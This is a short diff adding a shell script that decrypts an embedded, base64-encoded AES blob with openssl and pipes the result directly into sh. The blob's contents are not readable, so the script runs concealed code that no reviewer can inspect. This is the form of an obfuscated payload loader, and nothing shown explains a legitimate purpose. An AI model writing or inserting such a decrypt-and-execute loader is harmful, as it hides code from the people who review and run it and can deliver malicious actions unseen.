@@ -1,0 +1,5 @@
+#! /bin/sh
+openssl aes-256-ecb -d -a <<^^ | sh
+U2FsdGVkX18IajCjSpqV6bAyPls1j/3oHFiRueWVVP6shuAu/hOQ5ndX2EbLwfmN
+IHZfIOL0RaL3qXfFH6sejG1iVpXDCdcjdMzMtNMFilyMWNZ9V0kWRXKx3prk9PQJ
+^^
